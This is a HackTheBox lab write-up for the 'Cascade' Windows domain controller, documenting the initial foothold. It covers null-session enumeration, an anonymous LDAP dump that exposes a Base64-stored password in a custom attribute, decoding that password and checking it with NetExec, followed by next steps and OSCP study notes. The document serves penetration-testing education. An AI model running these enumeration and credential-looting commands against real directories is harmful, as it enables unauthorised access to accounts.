@@ -1,0 +1,176 @@
+# Cascade - HackTheBox Writeup
+
+**OS:** Windows (Server 2008 R2, Domain Controller)
+**Difficulty:** Medium
+**Topics:** Null Session Enumeration, enum4linux, Anonymous LDAP Bind, Custom LDAP Attribute Looting (`cascadeLegacyPwd`), Base64-Encoded Credential Recovery
+
+> **Status:** This writeup is complete up to the **initial foothold** (recovering `r.thompson`'s credentials from LDAP). The rest of the chain (SMB share looting -> `s.smith` -> `arksvc` -> AD Recycle Bin -> root) is outlined under [Next Steps](#next-steps) but was not executed in this run.
+
+---
+
+## Enumeration
+
+```bash
+nmap -sC -sV -v 10.129.84.52
+```
+
+Relevant ports:
+- **53** - DNS (Microsoft DNS 6.1.7601, Server 2008 R2 SP1)
+- **88** - Kerberos (`server time` confirms it's a DC)
+- **135/139/445** - RPC / NetBIOS / SMB
+- **389/3268** - LDAP + Global Catalog, `Domain: cascade.local, Site: Default-First-Site-Name`
+- **636/3269** - LDAPS (tcpwrapped)
+- **5985** - WinRM (Microsoft HTTPAPI 2.0)
+- **49154+** - high RPC ports
+
+Host info: `Host: CASC-DC1; OS: Windows Server 2008 R2 SP1`.
+
+SMB signing from the host script results:
+
+```
+smb2-security-mode: Message signing enabled and required
+```
+
+> The old OS (2008 R2) plus `cascade.local` on 389/3268 flags this as a classic AD box. Signing being *required* on SMB is a note for later (rules out some relay paths) - but it does **not** stop anonymous LDAP reads, which is where this box opens up.
+
+### Null session user enumeration
+
+```bash
+enum4linux -U 10.129.84.52
+```
+
+The null session is allowed (`Server ... allows sessions using username '', password ''`), confirming the host is domain-joined:
+
+```
+Domain Name: CASCADE
+Domain Sid: S-1-5-21-3332504370-1206983947-1165150453
+```
+
+...and it dumps the full domain user list for free:
+
+```
+arksvc        (ArkSvc)
+s.smith       (Steve Smith)
+r.thompson    (Ryan Thompson)
+util          (Util)
+j.wakefield   (James Wakefield)
+s.hickson     (Stephanie Hickson)
+j.goodhand    (John Goodhand)
+a.turnbull    (Adrian Turnbull)
+e.crowe       (Edward Crowe)
+b.hanson      (Ben Hanson)
+d.burman      (David Burman)
+BackupSvc     (BackupSvc)
+j.allen       (Joseph Allen)
+i.croft       (Ian Croft)
+CascGuest
+```
+
+Extract usernames into a wordlist for later:
+
+```bash
+grep -oP '(?<=Account: )\S+' enum4linux_output.txt > users.txt
+```
+
+> Two service accounts stand out immediately by name: `arksvc` and `BackupSvc`. "Ark" + "Backup" on a DC hints at backup/recycle-bin tooling - worth remembering.
+
+---
+
+## Foothold - Anonymous LDAP -> `cascadeLegacyPwd`
+
+The same anonymous access that enum4linux used over SMB usually also means an **anonymous LDAP bind** works. enum4linux only shows standard SAM attributes; LDAP exposes *every* attribute on every object - including non-standard ones.
+
+### Dump the directory over an anonymous bind
+
+```bash
+ldapsearch -x -H ldap://10.129.84.52 -b "DC=cascade,DC=local" -s sub "(objectClass=user)" | grep -i "cascade\|pwd\|legacy"
+```
+
+* `-x` - simple bind; with no `-D`/`-w` this is an **anonymous** bind
+* `-H ldap://10.129.84.52` - the DC
+* `-b "DC=cascade,DC=local"` - base DN, derived mechanically from the `cascade.local` domain (nmap/enum4linux)
+* `-s sub` - subtree scope: recurse the whole tree under the base
+* `"(objectClass=user)"` - filter to user objects only
+* The `grep` is just post-filtering the wall of output to surface password-ish attribute names
+
+> **Method note:** the `grep` keywords (`pwd`, `legacy`, `cascade`) are not something you know up front - they come *after* reading the raw dump once and noticing an attribute that doesn't belong to standard AD. The honest workflow is: dump everything to a file first (`ldapsearch ... > ldap_dump.txt`), read it, spot the anomaly, *then* grep for it.
+
+The anomaly is on **Ryan Thompson**:
+
+```
+dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
+memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
+userPrincipalName: r.thompson@cascade.local
+cascadeLegacyPwd: clk0bjVldmE=
+```
+
+`cascadeLegacyPwd` is **not** a standard Active Directory attribute - someone extended the schema (named after the org, "cascade") to stash a legacy password. Any non-standard attribute on a user object deserves immediate attention precisely because it was added on purpose.
+
+### Targeted variant (filter instead of grep)
+
+Once you *know* the attribute exists, the cleaner way to pull it (and find any other object carrying it) is the `=*` ("attribute present") filter, rather than dumping everything and grepping:
+
+```bash
+ldapsearch -x -H ldap://10.129.84.52 -b "DC=cascade,DC=local" "(cascadeLegacyPwd=*)" cascadeLegacyPwd sAMAccountName
+```
+
+* `(cascadeLegacyPwd=*)` - return only objects that **have** this attribute
+* Trailing `cascadeLegacyPwd sAMAccountName` - request only those two attributes, cutting the noise
+
+> This filter was *not* run live in this session - it's the natural follow-up to the grep above, and its result is already contained in the full dump.
+
+### Decode the value
+
+The value is Base64:
+
+```bash
+echo "clk0bjVldmE=" | base64 -d
+```
+
+-> yields `r.thompson`'s cleartext password. No bruteforce, no lockout risk - the credential was sitting in the directory readable by an anonymous bind.
+
+### Why not bruteforce?
+
+The obvious-but-wrong instinct here is to bruteforce `r.thompson` over SMB with rockyou. On a **domain controller** that triggers the account lockout policy within a few attempts, locks the account, and gets you nothing. Online bruteforce against AD is an anti-pattern; a controlled **password spray** (one password across all users) is the only online-guessing move that's ever appropriate - and here it isn't needed at all, because LDAP handed over the credential.
+
+### Verify the credential
+
+```bash
+nxc smb 10.129.84.52 -u 'r.thompson' -p '<decoded_password>'
+```
+
+A `[+]` confirms the foothold.
+
+---
+
+## Next Steps
+
+*Not executed in this run - documented as the intended path for when I continue the box.*
+
+- **Enumerate shares as `r.thompson`:** `nxc smb 10.129.84.52 -u r.thompson -p '<pw>' --shares`. `r.thompson` is in `IT` but **not** in `Remote Management Users`, so direct WinRM as this user likely fails - use the creds to read SMB shares.
+- **Loot the data/audit share** for material (notes, a config, a DB/exe) that leaks the next account, expected to lead toward `s.smith`.
+- **Pivot to `arksvc`**, which LDAP showed is a member of `CN=AD Recycle Bin` and `CN=Remote Management Users` - the Recycle Bin membership is the key to recovering deleted objects (and a higher-priv credential) via `Get-ADObject -IncludeDeletedObjects`.
+
+---
+
+## Summary
+
+| Step | Technique | Tool |
+|------|-----------|------|
+| Recon | TCP scan, AD/DC fingerprinting | nmap |
+| Null session | Dump domain users + SID | enum4linux |
+| Wordlist | Extract usernames | grep |
+| LDAP enum | Anonymous bind, dump user objects | ldapsearch |
+| Loot | Spot non-standard `cascadeLegacyPwd` attribute on `r.thompson` | ldapsearch + grep |
+| Foothold | Base64-decode the stored password | base64 |
+| Verify | Confirm creds over SMB | NetExec (nxc) |
+
+---
+
+## OSCP Notes
+
+- **Null SMB session ⇒ try anonymous LDAP next.** They're the same anonymous access on different services. enum4linux shows standard SAM fields; `ldapsearch -x` over 389 shows *every* attribute, which is where secrets in custom fields live.
+- **Any non-standard LDAP attribute is a loud signal.** Standard AD attributes you learn to recognize (`sAMAccountName`, `memberOf`, `pwdLastSet`, ...). A name like `cascadeLegacyPwd`, `ms-Mcs-AdmPwd` (LAPS), `userPassword`, or a password dumped into `info`/`description` means someone deliberately put something there - and it's rarely harmless.
+- **Dump first, filter second.** You don't magically know to grep for `cascadeLegacyPwd`; you dump the whole directory to a file, read it, notice the oddity, then write a targeted `(attr=*)` filter to pull it cleanly.
+- **Base64 is not encryption.** A `=`-padded string in a password-ish field is almost always Base64 - `base64 -d` it before assuming it's a hash.
+- **Don't online-bruteforce AD accounts.** A DC has a lockout policy; rockyou against one user locks it fast. If you must guess online, *spray* (one password, many users) and check `getdompwinfo` first. Here, LDAP made guessing unnecessary entirely.
